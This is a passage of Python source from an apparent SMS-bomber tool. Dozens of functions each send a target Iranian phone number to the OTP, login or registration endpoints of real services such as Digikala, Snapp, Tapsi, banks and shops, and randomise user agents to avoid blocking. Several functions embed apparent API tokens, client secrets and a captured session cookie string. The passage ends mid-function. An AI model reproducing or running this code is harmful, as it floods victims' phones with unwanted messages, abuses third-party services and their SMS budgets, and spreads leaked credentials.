        meH = {"Accept": "application/json","Accept-Encoding": "gzip, deflate, br","Accept-Language": "en-US,en;q=0.5","Connection": "keep-alive","Content-Type": "application/json","Cookie": "_ga=GA1.2.1307952465.1641249170; analytics_campaign={%22source%22:%22google%22%2C%22medium%22:%22organic%22}; analytics_token=2527d893-9de1-8fee-9f73-d666992dd3d5; _yngt=9d6ba2d2-fd1c-4dcc-9f77-e1e364af4434; _hjSessionUser_619539=eyJpZCI6IjcyOTJiODRhLTA2NGUtNTA0Zi04Y2RjLTA2MWE3ZDgxZDgzOSIsImNyZWF0ZWQiOjE2NDEyNDkxNzEzMTUsImV4aXN0aW5nIjp0cnVlfQ==; _gid=GA1.2.284804399.1642278349; _gat_gtag_UA_106934660_1=1; _gat_UA-0000000-1=1; analytics_session_token=238e3f23-aff7-8e3a-f1d4-ef4f6c471e2b; yektanet_session_last_activity=1/15/2022; _yngt_iframe=1; _gat_UA-106934660-1=1; _hjIncludedInSessionSample=0; _hjSession_619539=eyJpZCI6IjRkY2U2ODUwLTQzZjktNGM0Zi1iMWUxLTllY2QzODA3ODhiZCIsImNyZWF0ZWQiOjE2NDIyNzgzNTYzNjgsImluU2FtcGxlIjpmYWxzZX0=; _hjIncludedInPageviewSample=1; _hjAbsoluteSessionInProgress=0","Host": "www.hamrah-mechanic.com","Origin": "https://www.hamrah-mechanic.com","Referer": "https://www.hamrah-mechanic.com/membersignin/","Source": "web","TE": "trailers","User-Agent": generate_user_agent(os="linux")}
        meD = {"landingPageUrl": "https://www.hamrah-mechanic.com/","orderPageUrl": "https://www.hamrah-mechanic.com/membersignin/","phoneNumber": "0"+phone.split("+98")[1],"prevDomainUrl": None,"prevUrl": None,"referrer": "https://www.google.com/"}
        try:
            post(url=meU, headers=meH, data=meD)
            return True
        except:
            pass


    def hyperjan(phone):
        rhead = {"user-agent": generate_user_agent()}
        snapD = {"mobile": "0"+phone.split("+98")[1]}
        try:
            post(url="https://shop.hyperjan.ir/api/users/manage", json=snapD, headers=rhead)
            return True
        except:
            pass


    def digikala(phone):
        rhead = {"user-agent": generate_user_agent()}
        n4 = {"username": "0"+phone.split("+98")[1]}
        try:
            post(url="https://api.digikala.com/v1/user/authenticate/", data=n4, headers=rhead)
            return True
        except:
            pass


    def devslop(phone):
        n5 = phone.split("+98")[1]
        n4 = f"number=0{n5}&state=number&"
        headers = {"Content-Type": "application/x-www-form-urlencoded; charset\u003dUTF-8","User-Agent": generate_user_agent(os="android"), "Host": "i.devslop.app", "Connection": "Keep-Alive", "Accept-Encoding": "gzip", "Content-Length": "32"}
        try:
            post(url="https://i.devslop.app/app/ifollow/api/otp.php", headers=headers, data=n4)
            return True
        except:
            pass


    def hiword(phone):
        rhead = {"user-agent": generate_user_agent()}
        n4 = {"identifier": "0"+phone.split("+98")[1]}
        try:
            post(url="https://hiword.ir/wp-json/otp-login/v1/login", data=n4, headers=rhead)
            return True
        except:
            pass


    def abantether(phone):
        rhead = {"user-agent": generate_user_agent()}
        n4 = {"phoneNumber": "0"+phone.split("+98")[1]}
        try:
            post(url="https://abantether.com/users/register/phone/send/", data=n4, headers=rhead)
            return True
        except:
            pass


    def bit24(phone):
        rhead = {"user-agent": generate_user_agent()}
        n4 = {"mobile": "0"+phone.split("+98")[1]}
        try:
            post(url="https://api.bit24.cash/api/v3/auth/check-mobile", data=n4, headers=rhead)
            return True
        except:
            pass


    def dicardo(phone):
        rhead = {"user-agent": generate_user_agent()}
        n4 = {"phone": "0"+phone.split("+98")[1]}
        try:
            post(url="https://dicardo.com/main/sendsms", data=n4, headers=rhead)
            return True
        except:
            pass


    def ghasedak24(phone):
        rhead = {"user-agent": generate_user_agent()}
        n4 = {"username": "0"+phone.split("+98")[1]}
        try:
            post(url="https://ghasedak24.com/user/ajax_register", data=n4, headers=rhead)
            return True
        except:
            pass


    def tikban(phone):
        rhead = {"user-agent": generate_user_agent()}
        n4 = {"CellPhone": "0"+phone.split("+98")[1]}
        try:
            post(url="https://tikban.com/Account/LoginAndRegister", data=n4, headers=rhead)
            return True
        except:
            pass


    def digistyle(phone):
        rhead = {"user-agent": generate_user_agent()}
        n4 = {"loginRegister[email_phone]": "0"+phone.split("+98")[1]}
        try:
            post(url="https://www.digistyle.com/users/login-register/", data=n4, headers=rhead)
            return True
        except:
            pass


    def banankala(phone):
        rhead = {"user-agent": generate_user_agent()}
        n4 = {"Mobile": "0"+phone.split("+98")[1]}
        try:
            post(url="https://banankala.com/home/login", data=n4, headers=rhead)
            return True
        except:
            pass


    def iranketab(phone):
        rhead = {"user-agent": generate_user_agent()}
        n4 = {"UserName": "0"+phone.split("+98")[1]}
        try:
            post(url="https://www.iranketab.ir/account/register", data=n4, headers=rhead)
            return True
        except:
            pass


    def ketabchi(phone):
        rhead = {"user-agent": generate_user_agent()}
        n4 = {"phoneNumber": "0"+phone.split("+98")[1]}
        try:
            post(url="https://ketabchi.com/api/v1/auth/requestVerificationCode", data=n4, headers=rhead)
            return True
        except:
            pass


    def tapsi(phone):
        rhead = {"user-agent": generate_user_agent()}
        n5 = phone.split("+98")[1]
        try:
            post(url=f"https://join.tapsi.ir/smsConfirm?phoneNumber=0{n5}", headers=rhead)
            return True
        except:
            pass


    def offdecor(phone):
        n4 = {"phone": "0"+phone.split("+98")[1]}
        rhead = {"user-agent": generate_user_agent()}
        try:
            post(url="https://www.offdecor.com/index.php?route=account/login/sendCode", data=n4, headers=rhead)
            return True
        except:
            pass


    def exo(phone):
        n4 = {"mobile_number": "0"+phone.split("+98")[1]}
        rhead = {"user-agent": generate_user_agent()}
        try:
            post(url="https://exo.ir/index.php?route=account/mobile_login", data=n4, headers=rhead)
            return True
        except:
            pass


    def shahrfarsh(phone):
        n4 = {"phoneNumber": "0"+phone.split("+98")[1]}
        rhead = {"user-agent": generate_user_agent()}
        try:
            post(url="https://shahrfarsh.com/Account/Login", data=n4, headers=rhead)
            return True
        except:
            pass

            
    def takfarsh(phone):
        n4 = {"phone_email": "0"+phone.split("+98")[1]}
        rhead = {"user-agent": generate_user_agent()}
        try:
            post(url="https://takfarsh.com/wp-content/themes/bakala/template-parts/send.php", data=n4, headers=rhead)
            return True
        except:
            pass


    def beheshticarpet(phone):
        n4 = {"billing_mobile": "0"+phone.split("+98")[1]}
        rhead = {"user-agent": generate_user_agent()}
        try:
            post(url="https://shop.beheshticarpet.com/my-account/", data=n4, headers=rhead)
            return True
        except:
            pass


    def khanoumi(phone):
        n4 = {"mobile": "0"+phone.split("+98")[1]}
        rhead = {"user-agent": generate_user_agent()}
        try:
            post(url="https://www.khanoumi.com/accounts/sendotp", data=n4, headers=rhead)
            return True
        except:
            pass


    def rojashop(phone):
        n4 = {"mobile": "0"+phone.split("+98")[1]}
        rhead = {"user-agent": generate_user_agent()}
        try:
            post(url="https://rojashop.com/api/auth/sendOtp", data=n4, headers=rhead)
            return True
        except:
            pass


    def dadpardaz(phone):
        n4 = {"mobile": "0"+phone.split("+98")[1]}
        rhead = {"user-agent": generate_user_agent()}
        try:
            post(url="https://dadpardaz.com/advice/getLoginConfirmationCode", data=n4, headers=rhead)
            return True
        except:
            pass


    def rokla(phone):
        n4 = {"mobile": "0"+phone.split("+98")[1]}
        rhead = {"user-agent": generate_user_agent()}
        try:
            post(url="https://api.rokla.ir/api/request/otp", data=n4, headers=rhead)
            return True
        except:
            pass


    def khodro45(phone):
        n4 = {"mobile": "0"+phone.split("+98")[1]}
        rhead = {"user-agent": generate_user_agent()}
        try:
            post(url="https://khodro45.com/api/v1/customers/otp/", data=n4, headers=rhead)
            return True
        except:
            pass


    def mashinbank(phone):
        n4 = {"mobileNumber": "0"+phone.split("+98")[1]}
        rhead = {"user-agent": generate_user_agent()}
        try:
            post(url="https://mashinbank.com/api2/users/check", data=n4, headers=rhead)
            return True
        except:
            pass


    def pezeshket(phone):
        n4 = {"mobileNumber": "0"+phone.split("+98")[1]}
        rhead = {"user-agent": generate_user_agent()}
        try:
            post(url="https://api.pezeshket.com/core/v1/auth/requestCode", data=n4, headers=rhead)
            return True
        except:
            pass

    def virgool(phone):
        n4 = {"method": "phone", "identifier": phone}
        rhead = {"user-agent": generate_user_agent()}
        try:
            post(url="https://virgool.io/api/v1.4/auth/verify", data=n4, headers=rhead)
            return True
        except:
            pass

    def timcheh(phone):
        n4 = {"mobile": "0"+phone.split("+98")[1]}
        rhead = {"user-agent": generate_user_agent()}
        try:
            post(url="https://api.timcheh.com/auth/otp/send", data=n4, headers=rhead)
            return True
        except:
            pass


    def helsa(phone):
        n5 = phone.split("+98")[1]
        rhead = {"user-agent": generate_user_agent()}
        try:
            post(url=f"https://api.helsa.co/api/User/GetRegisterCode?mobileNumber=0{n5}&deviceId=050102153736100048967953736091842424&discountCode=&utm_content=&utm_source=&utm_campain=", headers=rhead)
            return True
        except:
            pass


    def paklean(phone):
        n4 = {"username": "0"+phone.split("+98")[1]}
        rhead = {"user-agent": generate_user_agent()}
        try:
            post(url="https://client.api.paklean.com/user/resendCode", json=n4, headers=rhead)
            return True
        except:
            pass
            
    def mobogift(phone):
        n4 = {"username": "0"+phone.split("+98")[1]}
        rhead = {"user-agent": generate_user_agent()}
        try:
            post(url="https://mobogift.com/signin", data=n4, headers=rhead)
            return True
        except:
            pass


    def iranicard(phone):
        n4 = {"mobile": "0"+phone.split("+98")[1]}
        rhead = {"user-agent": generate_user_agent()}
        try:
            post(url="https://api.iranicard.ir/api/v1/register", data=n4, headers=rhead)
            return True
        except:
            pass


    def pubgsell(phone):
        n5 = phone.split("+98")[1]
        rhead = {"user-agent": generate_user_agent()}
        try:
            post(url="https://pubg-sell.ir/loginuser?username=0{n5}", headers=rhead)
            return True
        except:
            pass


    def tj8(phone):
        n4 = {"mobile": "0"+phone.split("+98")[1]}
        rhead = {"user-agent": generate_user_agent()}
        try:
            post(url="https://tj8.ir/auth/register", data=n4, headers=rhead)
            return True
        except:
            pass


    def mashinbank(phone):
        n4 = {"mobileNumber": "0"+phone.split("+98")[1]}
        rhead = {"user-agent": generate_user_agent()}
        try:
            post(url="https://mashinbank.com/api2/users/check", data=n4, headers=rhead)
            return True
        except:
            pass


    def cinematicket(phone):
        n4 = {"phone_number": "0"+phone.split("+98")[1]}
        rhead = {"user-agent": generate_user_agent()}
        try:
            post(url="https://cinematicket.org/api/v1/users/signup", data=n4, headers=rhead)
            return True
        except:
            pass


    def irantic(phone):
        n4 = {"mobile": "0"+phone.split("+98")[1]}
        rhead = {"user-agent": generate_user_agent()}
        try:
            post(url="https://www.irantic.com/api/login/request", data=n4, headers=rhead)
            return True
        except:
            pass


    def kafegheymat(phone):
        n4 = {"phone": "0"+phone.split("+98")[1]}
        rhead = {"user-agent": generate_user_agent()}
        try:
            post(url="https://kafegheymat.com/shop/getLoginSms", data=n4, headers=rhead)
            return True
        except:
            pass


    def express(phone):
        n4 = {"cellphone": "0"+phone.split("+98")[1]}
        rhead = {"user-agent": generate_user_agent()}
        try:
            post(url="https://api.snapp.express/mobile/v4/user/loginMobileWithNoPass?client=PWA&optionalClient=PWA&deviceType=PWA&appVersion=5.6.6&optionalVersion=5.6.6&UDID=bb65d956-f88b-4fec-9911-5f94391edf85", data=n4, headers=rhead)
            return True
        except:
            pass


    def delino(phone):
        n4 = {"mobile": "0"+phone.split("+98")[1]}
        rhead = {"user-agent": generate_user_agent()}
        try:
            post(url="https://www.delino.com/user/register", data=n4, headers=rhead)
            return True
        except:
            pass


    def alopeyk(phone):
        n4 = {"phone": "0"+phone.split("+98")[1]}
        rhead = {"user-agent": generate_user_agent()}
        try:
            post(url="https://alopeyk.com/api/sms/send.php", data=n4, headers=rhead)
            return True
        except:
            pass


    def tamland(phone):
        n4 = {"Mobile": "0"+phone.split("+98")[1]}
        rhead = {"user-agent": generate_user_agent()}
        try:
            post(url="https://1401api.tamland.ir/api/user/signup", data=n4, headers=rhead)
            return True
        except:
            pass


    def opco(phone):
        n4 = {"telephone": "0"+phone.split("+98")[1]}
        rhead = {"user-agent": generate_user_agent()}
        try:
            post(url="https://shop.opco.co.ir/index.php?route=extension/module/login_verify/update_register_code", data=n4, headers=rhead)
            return True
        except:
            pass


    def digikalajet(phone):
        n4 = {"phone": "0"+phone.split("+98")[1]}
        rhead = {"user-agent": generate_user_agent()}
        try:
            post(url="https://api.digikalajet.ir/user/login-register/", data=n4, headers=rhead)
            return True
        except:
            pass

    def melix(phone):
        n4 = {"mobile": "0"+phone.split("+98")[1]}
        rhead = {"user-agent": generate_user_agent()}
        try:
            post(url="https://melix.shop/site/api/v1/user/otp", json=n4, headers=rhead)
            return True
        except:
            pass

            
    def safiran(phone):
        n4 = {"mobile": "0"+phone.split("+98")[1]}
        rhead = {"user-agent": generate_user_agent()}
        try:
            post(url="https://safiran.shop/login", json=n4, headers=rhead)
            return True
        except:
            pass



    def deyfriedchicken(phone):
        js = {"apiToken":"VyG4uxayCdv5hNFKmaTeMJzw3F95sS9DVMXzMgvzgXrdyxHJGFcranHS2mECTWgq","clientSecret":"7eVdaVsYXUZ2qwA9yAu7QBSH2dFSCMwq","device":"web","username":"0" + phone.split("+98")[1]}

        rhead = {"user-agent": generate_user_agent()}
        try: #shop.deyfriedchicken.com
            post(url="https://restaurant.delino.com/user/register",json=js, headers=rhead)
            return True
        except:
            pass


            
    def donergarden(phone):
        js = {"apiToken":"Ex0OHO6iS8ZfklgSKhaTmWAp34lYLNLFZvMXiuVfhc2ov2uq9kpwYUUrxTWNnhWE","clientSecret":"BuUDcLI9IMQNpWeaHYtVfKzoxwEZNza4","device":"web","username":"0" + phone.split("+98")[1]}
        rhead = {"user-agent": generate_user_agent()}
        try: #donergarden.com
            post(url="https://restaurant.delino.com/user/register",json=js, headers=rhead)
            return True
        except:
            pass
            
            
    def foodbell(phone):
        js = {"apiToken":"WTKnmBBIpjL8kcOo7YGD0qkaa6p06bVER9IMUNsyVOj9J2AMlmjESWhqtuNqWBNN","clientSecret":"aINO67nX5aCs5e7382XQJZkYbROBBewt","device":"web","username":"0" + phone.split("+98")[1]}

        rhead = {"user-agent": generate_user_agent()}
        try: #foodbell.ir
            post(url="https://restaurant.delino.com/user/register",json=js, headers=rhead)
            return True
        except:
            pass

            
    def foodiran16(phone):
        js = {"apiToken":"mUkchCAJ9Po58IqEzz507gKwv5mz2kzplUctHuTxXDrTAfjfHyPJqXKGJxrnaKSX","clientSecret":"HVB23K4Y9LPvOLuUCTo3QOHolaYGupgP","device":"web","username":"0" + phone.split("+98")[1]}
        rhead = {"user-agent": generate_user_agent()}
        try: #foodiran16.com
            post(url="https://restaurant.delino.com/user/register",json=js, headers=rhead)
            return True
        except:
            pass

            
    def foodlandkish(phone):
        js = {"apiToken":"KbCO8YaHKctowfL1Rny8gB9A9B2kGZvHJBbN918Nsn1p2Ui0FbLWdJ1JdCQ6hzAu","clientSecret":"MvfPc5BT2lRrpmOCYZzAAGg7d7J8ZVnv","device":"web","username":"0" + phone.split("+98")[1]}
        rhead = {"user-agent": generate_user_agent()}
        try: #foodlandkish.com
            post(url="https://restaurant.delino.com/user/register",json=js, headers=rhead)
            return True
        except:
            pass

            
    def garcon(phone):
        js = {"phone":"0" + phone.split("+98")[1]}
        rhead = {"user-agent": generate_user_agent()}
        try: 
            post(url="https://garcon.tandori.ir/users/v1/main/login",json=js, headers=rhead)
            return True
        except:
            pass

            
    def gelatohouse(phone):
        js = {"apiToken":"10tQStiKTniALgYpYQ4hm0UCuadXWbHdMklMIpyTE5DSzkNSfx1r2p02pqg3QKx3","clientSecret":"MZ0TNC0swsGFk6gbfCdvtZHRukZyFntu","device":"web","username":"0" + phone.split("+98")[1]}
        rhead = {"user-agent": generate_user_agent()}
        try: #order.gelatohouse.ir
            post(url="https://restaurant.delino.com/user/register",json=js, headers=rhead)
            return True
        except:
            pass

            
    def givernfood(phone):
        js = {"apiToken":"iIWfAtW16GstuASFfuUO0iY9LKz3dKQpdsKZ2ANBK5YokN2J7pom4oq0tYTz5eXv","clientSecret":"mpZYwzraYAyzcpD594LpWbHwTgHIcdNO","device":"web","username":"0" + phone.split("+98")[1]}

        rhead = {"user-agent": generate_user_agent()}
        try: #givernfood.com
            post(url="https://restaurant.delino.com/user/register",json=js, headers=rhead)
            return True
        except:
            pass

            
    def mahiyekhoob(phone):
        js = {"apiToken":"yJHp0J8gMDyUlAvrWC2E7G0OITtM18WXdRZdGSC2gKkkC8QHDBDsf5irJ4gpZvqP","clientSecret":"uTsq8sG1YWuIWcvK24UFtPighOfrl2H6","device":"web","username":"0" + phone.split("+98")[1]}
        rhead = {"user-agent": generate_user_agent()}
        try: #mahiyekhoob.com
            post(url="https://restaurant.delino.com/user/register",json=js, headers=rhead)
            return True
        except:
            pass

            
    def nesengrill(phone):
        js = {"apiToken":"GAbsdbjms1fx2ow35UnRCxxIbYPaNTfbq67clc9r09TtjqcxzrAbNFLTNSRFLJZZ","clientSecret":"gK6flStcuutxn82oGDqGqFqrvDTTQEZ2","device":"web","username":"0" + phone.split("+98")[1]}

        rhead = {"user-agent": generate_user_agent()}
        try: #nesengrill.ir
            post(url="https://restaurant.delino.com/user/register",json=js, headers=rhead)
            return True
        except:
            pass

            
    def pirankalaco(phone):
        head = {'accept': '*/*','Accept-Encoding': 'gzip, deflate, br','Accept-Language': 'en-US,en;q=0.9','Content-Length': '17','Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8','Origin': 'https://pirankalaco.ir','Referer': 'https://pirankalaco.ir/shop/login.php','Sec-Ch-Ua': '".Not/A)Brand";v="99", "Google Chrome";v="103", "Chromium";v="103"','Sec-Ch-Ua-mobile': '?0','Sec-Ch-Ua-platform': 'Windows','Sec-Fetch-Dest': 'empty','User-Agent': generate_user_agent(os="win"),'X-Requested-with': 'XMLHttpRequest'}
        try: 
            post(url="https://pirankalaco.ir/shop/SendPhone.php",data=f"phone=0{phone.split('+98')[1]}",headers=head)
            return True
        except:
            pass

            
    def pizzapanjereh(phone):
        js = {"apiToken":"lv3sgZvKKUgc3GpayVVBq8Sw3tguTk9IYbGIXhLGjnhDQtyTNwD2gzwncF1x4B1j","clientSecret":"Vvo4qB2gRUNwev5A2w5osgS19HhAmAUM","device":"web","username":"0" + phone.split("+98")[1]}
        rhead = {"user-agent": generate_user_agent()}
        try: #pizzapanjereh.com
            post(url="https://restaurant.delino.com/user/register",json=js, headers=rhead)
            return True
        except:
            pass

            
    def shandiz(phone):
        js = {"apiToken":"sNpW61dZELLTwNhUD2YDsVuwMvzUihTLIEYpCSJDjXfH7GMfmDr9j5eWc4KJAJ2h","clientSecret":"va41e57WSFf6qO8o6i9oiAe5PcLuG3lS","device":"web","username":"0" + phone.split("+98")[1]}
        rhead = {"user-agent": generate_user_agent()}
        try: #shandiz.co
            post(url="https://restaurant.delino.com/user/register",json=js, headers=rhead)
            return True
        except:
            pass

            
    def tnovin(phone):
        head = {'accept': '*/*','Accept-Encoding': 'gzip, deflate, br','Accept-Language': 'en-US,en;q=0.9','Content-Length': '17','Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8','Host': 'shop.tnovin.com','Origin': 'http://shop.tnovin.com','Referer': 'http://shop.tnovin.com/login','Sec-Ch-Ua': '".Not/A)Brand";v="99", "Google Chrome";v="103", "Chromium";v="103"','Sec-Ch-Ua-mobile': '?0','Sec-Ch-Ua-platform': 'Windows','Sec-Fetch-Dest': 'empty','User-Agent': generate_user_agent(os="win"),'X-Requested-with': 'XMLHttpRequest'}
        try: 
            post(url="http://shop.tnovin.com/login",data=f"phone=0{phone.split('+98')[1]}",headers=head)
            return True
        except:
            pass

    def dastkhat(phone):
        n4 = {"mobile":phone.split('+98')[1],"countryCode":98,"device_os":2}
        rhead = {"user-agent": generate_user_agent()}
        try: 
            post(url="https://dastkhat-isad.ir/api/v1/user/store",json=n4, headers=rhead)
            return True
        except:
            pass

    def hamlex(phone):
        n4 =  f"fullname=%D9%85%D9%85%D8%AF&phoneNumber=0{phone.split('+98')[1]}&register="
        h4 = {'Accept': '*/*','Accept-Encoding': 'gzip, deflate, br','Accept-Language': 'en-US,en;q=0.9','Content-Length': '61','Content-Type': 'application/x-www-form-urlencoded','Origin': 'https://hamlex.ir','Referer': 'https://hamlex.ir/register.php','Sec-Ch-Ua': '"Chromium";v="104", " Not A;Brand";v="99", "Google Chrome";v="104"','Sec-Ch-Ua-Mobile': '?0','Sec-Ch-Ua-Platform': 'Windows','sec-fetch-dest': 'document','sec-fetch-mode': 'navigate','sec-fetch-site': 'same-origin','sec-fetch-user': '?1','upgrade-insecure-requests': '1','User-Agent': generate_user_agent(os="win")}
        try: 
            post(url="https://hamlex.ir/register.php",data=n4,headers=h4)
            return True
        except:
            pass

    def irwco(phone):
        n4 =  f"mobile=0{phone.split('+98')[1]}"
        h4 = {'Accept': '*/*','Accept-Encoding': 'gzip, deflate, br','Accept-Language': 'en-US,en;q=0.9','Content-Length': '18','Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8','Origin': 'https://irwco.ir','Referer': 'https://irwco.ir/register','Sec-Ch-Ua': '"Chromium";v="104", " Not A;Brand";v="99", "Google Chrome";v="104"','Sec-Ch-Ua-Mobile': '?0','Sec-Ch-Ua-Platform': 'Windows','Sec-Fetch-Dest': 'empty','Sec-Fetch-Mode': 'cors','Sec-Fetch-Site': 'same-origin','User-Agent': generate_user_agent(os="win"),'X-Requested-Rith': 'XMLHttpRequest'}
        try: 
            post(url="https://irwco.ir/register",data=n4,headers=h4)
            return True
        except:
            pass

            
    def moshaveran724(phone):
        n4 =  f"againkey=0{phone.split('+98')[1]}&cache=false"
        h4 = {'Accept': '*/*','Accept-Encoding': 'gzip, deflate, br','Accept-Language': 'en-US,en;q=0.9','Content-Length': '32','Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8','Origin': 'https://moshaveran724.ir','Referer': 'https://moshaveran724.ir/user/register/','Sec-Ch-Ua': '"Chromium";v="104", " Not A;Brand";v="99", "Google Chrome";v="104"','Sec-Ch-Ua-Mobile': '?0','Sec-Ch-Ua-Platform': 'Windows','Sec-Fetch-Dest': 'empty','Sec-Fetch-Mode': 'cors','Sec-Fetch-Site': 'same-origin','User-Agent': generate_user_agent(os="win"),'x-requested-with': 'XMLHttpRequest'}
        try: 
            post(url="https://moshaveran724.ir/m/pms.php",data=n4,headers=h4)
            return True
        except:
            pass

            
    def sibbank(phone):
        n4 = {"phone_number": "0" + phone.split("+98")[1]}
        h4 = {'accept': 'application/json, text/plain, */*','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.5','connection': 'keep-alive','content-length': '30','content-type': 'application/json','host': 'api.sibbank.ir','origin': 'https://sibbank.ir','referer': 'https://sibbank.ir/','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-site','TE': 'trailers','user-agent': generate_user_agent(os="mac")}
        try: 
            post(url="https://api.sibbank.ir/v1/auth/login",json=n4,headers=h4)
            return True
        except:
            pass

            
    def snapp_link(phone):
        n4 = {"phone": "0" + phone.split("+98")[1]}
        h4 = {'Accept': 'application/json','Accept-Encoding': 'gzip, deflate, br','Accept-Language': 'en-US,en;q=0.9','Content-Length': '23','Content-Type': 'application/json','Origin': 'https://snapp.ir','Referer': 'https://snapp.ir/','Sec-Ch-Ua': '"Chromium";v="104", " Not A;Brand";v="99", "Google Chrome";v="104"','Sec-Ch-Ua-Mobile': '?0','Sec-Ch-Ua-Platform': 'Windows','Sec-Fetch-Dest': 'empty','Sec-Fetch-Mode': 'cors','Sec-Fetch-Site': 'same-site','User-Agent': generate_user_agent(os="win")}
        try: 
            post(url="https://api.snapp.ir/api/v1/sms/link",json=n4,headers=h4)
            return True
        except:
            pass

            
    def steelalborz(phone):
        n4 = f'action=digits_check_mob&countrycode=%2B98&mobileNo=0{phone.split("+98")[1]}&csrf=2aae5b41f1&login=2&username=&email=&captcha=&captcha_ses=&digits=1&json=1&whatsapp=0&digregcode=%2B98&digits_reg_mail=0{phone.split("+98")[1]}&dig_otp=&code=&dig_reg_mail=&dig_nounce=2aae5b41f1'
        h4 = {'accept': '*/*','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9','content-length': '248','content-type': 'application/x-www-form-urlencoded; charset=UTF-8','origin': 'https://steelalborz.com','referer': 'https://steelalborz.com/?login=true&page=1&redirect_to=https%3A%2F%2Fsteelalborz.com%2F','sec-ch-ua': '"Chromium";v="104", " Not A;Brand";v="99", "Google Chrome";v="104"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': 'Windows','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-origin','user-agent': generate_user_agent(os="win"),'x-requested-with': 'XMLHttpRequest'}
        try: 
            post(url="https://steelalborz.com/wp-admin/admin-ajax.php",data=n4,headers=h4)
            return True
        except:
            pass


    def miare(phone):
        n4 = {"phone_number":"0"+phone.split('+98')[1]}
        
        rhead = {"user-agent": generate_user_agent()}
        try: 
            post(url="https://www.miare.ir/api/otp/driver/request/",json=n4, headers=rhead)
            return True
        except:
            pass

                    
    def arshiyan(phone):
        n4 = {"country_code":"98","phone_number":phone.split('+98')[1]}
        rhead = {"user-agent": generate_user_agent()}
        try: 
            post(url="https://api.arshiyan.com/send_code",json=n4, headers=rhead)
            return True
        except:
            pass


            
    def topnoor(phone):
        n4 = {"mobile":"0"+phone.split('+98')[1]}
        rhead = {"user-agent": generate_user_agent()}
        try: 
            post(url="https://backend.topnoor.ir/web/v1/user/otp",json=n4, headers=rhead)
            return True
        except:
            pass


            
    def alinance(phone):
        n4 =  {"phone_number":"0"+phone.split('+98')[1]}
        
        rhead = {"user-agent": generate_user_agent()}
        try: 
            post(url="https://api.alinance.com/user/register/mobile/send/",json=n4, headers=rhead)
            return True
        except:
            pass


    def alopeyk(phone):
        n4 = {"type":"CUSTOMER","model":"Chrome 104.0.0.0","platform":"pwa","version":"10","manufacturer":"Windows","isVirtual":False,"serial":True,"app_version":"1.2.6","uuid":True,"phone":"0"+phone.split('+98')[1]}
        rhead = {"user-agent": generate_user_agent()}
        try: 
            post(url="https://api.alopeyk.com/api/v2/login?platform=pwa",json=n4, headers=rhead)
            return True
        except:
            pass

    def alopeyk_safir(phone):
        n4 = {'phone':'0'+phone.split('+98')[1]}
        rhead = {"user-agent": generate_user_agent()}
        try: 
            post(url="https://api.alopeyk.com/safir-service/api/v1/login",json=n4, headers=rhead)
            return True
        except:
            pass

    def balad(phone):
        n4 = {"phone_number":"0"+phone.split('+98')[1],"os_type":"W"}
        rhead = {'accept': '*/*','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9','content-length': '44','content-type': 'application/json','device-id': '572a5145-d472-430a-9614-b258232873e6','origin': 'https://balad.ir','referer': 'https://balad.ir/','sec-ch-ua': '"Chromium";v="104", " Not A;Brand";v="99", "Google Chrome";v="104"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': 'Windows','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-site','user-agent': generate_user_agent(os="win")}
        try: 
            post(url="https://account.api.balad.ir/api/web/auth/login/",json=n4, headers=rhead)
            return True
        except:
            pass

    def chaymarket(phone):
        n4 = f"action=digits_check_mob&countrycode=%2B98&mobileNo=0{phone.split('+98')[1]}&csrf=c832b38a97&login=2&username=&email=&captcha=&captcha_ses=&json=1&whatsapp=0"
        rhead = {'accept': '*/*','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9','content-length': '143','content-type': 'application/x-www-form-urlencoded; charset=UTF-8','origin': 'https://www.chaymarket.com','referer': 'https://www.chaymarket.com/user/my-account/','sec-ch-ua': '"Chromium";v="104", " Not A;Brand";v="99", "Google Chrome";v="104"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': 'Windows','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-origin','user-agent': generate_user_agent(os="win"),'x-requested-with': 'XMLHttpRequest'}
        try: 
            post(url="https://www.chaymarket.com/wp-admin/admin-ajax.php",data=n4, headers=rhead)
            return True
        except:
            pass

    def coffefastfoodluxury(phone):
        n4 = f"action=digits_check_mob&countrycode=%2B98&mobileNo=0{phone.split('+98')[1]}&csrf=e23c15918c&login=2&username=&email=&captcha=&captcha_ses=&digits=1&json=1&whatsapp=0&digregcode=%2B98&digits_reg_mail=0{phone.split('+98')[1]}&dig_otp=&code=&dig_reg_mail=&dig_nounce=e23c15918c"

        rhead = {'accept': '*/*','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9','content-length': '248','content-type': 'application/x-www-form-urlencoded; charset=UTF-8','origin': 'https://coffefastfoodluxury.ir','referer': 'https://coffefastfoodluxury.ir/product-category/coffeshop/?login=true&page=1&redirect_to=https%3A%2F%2Fcoffefastfoodluxury.ir%2Fproduct-category%2Fcoffeshop%2F','sec-ch-ua': '"Chromium";v="104", " Not A;Brand";v="99", "Google Chrome";v="104"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': 'Windows','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-origin','user-agent': generate_user_agent(os="win"),'x-requested-with': 'XMLHttpRequest'}
        try: 
            post(url="https://coffefastfoodluxury.ir/wp-admin/admin-ajax.php",data=n4, headers=rhead)
            return True
        except:
            pass

    def dadhesab(phone):
        n4 = {"username":"0"+phone.split('+98')[1]}
